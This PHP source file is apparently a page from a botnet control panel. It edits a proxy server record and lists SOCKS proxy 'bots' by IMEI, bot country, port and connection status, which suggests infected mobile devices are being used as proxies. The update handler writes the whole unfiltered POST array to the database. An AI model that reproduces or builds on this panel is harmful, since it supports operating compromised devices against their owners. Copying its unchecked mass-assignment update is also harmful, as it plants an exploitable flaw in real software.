<?php
session_start();
require_once './config/config.php';
require_once 'includes/auth_validate.php';


// Sanitize if you want
$server_id = filter_input(INPUT_GET, 'server_id', FILTER_VALIDATE_INT);
$operation = filter_input(INPUT_GET, 'operation',FILTER_SANITIZE_STRING);
($operation == 'edit') ? $edit = true : $edit = false;
//Handle update request
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
    $server_id = filter_input(INPUT_GET, 'server_id', FILTER_VALIDATE_INT);

    $data_to_update = filter_input_array(INPUT_POST);

    #$data_to_update['updated_at'] = date('Y-m-d H:i:s');

    $db->where('id',$server_id);
    $stat = $db->update('proxy_servers', $data_to_update);

    if($stat)
    {
        $_SESSION['success'] = "Server updated successfully!";
        header('location: clients.php');
        exit();
    }
}


if($edit)
{
    $db->where('id', $server_id);
    $server = $db->getOne("proxy_servers");

}

require_once 'includes/header.php';
?>

    <div id="page-wrapper">
        <div class="row">
            <h2 class="page-header">Update Server</h2>

        </div>
        <!-- Success message -->
        <?php
        include('./includes/flash_messages.php')
        ?>
        <form class="" action="" method="post" enctype="multipart/form-data" id="server_form">
            <?php  include_once('./includes/forms/pserver_form.php'); ?>
        </form>


        <!-- command list for the client -->
        <br>
        <div class="row">
            <h2 class="page-header">Server proxies</h2>
        </div>
        <?php
        $db->where('server', '%' . $server['id'] . '%', 'like');
        $socks = $db->get('socks');
        ?>
        <table class="table table-striped table-bordered table-condensed">
            <thead>
            <tr>
                <th class="header">#</th>
                <th>IMEI</th>
                <th>Bot country</th>
                <th>Port</th>
                <th>Connect time</th>
                <th>Status</th>
            </tr>
            </thead>
            <tbody>
            <?php
            foreach ($socks as $row) { ?>
                <tr>
                    <td><?php echo $row['id'] ?></td>
                    <td><?php echo $row['imei'] ?></td>
                    <td><?php echo $row['bot_country'] ?></td>
                    <td><?php echo $row['port'] ?></td>
                    <td><?php echo date("Y-m-d H:i",$row['connect_time']) ?></td>
                    <td><i class="glyphicon glyphicon-sort" aria-hidden="true" <?php if ($row['status']) {echo 'style="color:#5bb85c;"';} else {echo 'style="color:#d43f3a;"';}?>></i></td>
                </tr>

            <?php } ?>
            </tbody>
        </table>

    </div>


<?php include_once 'includes/footer.php'; ?>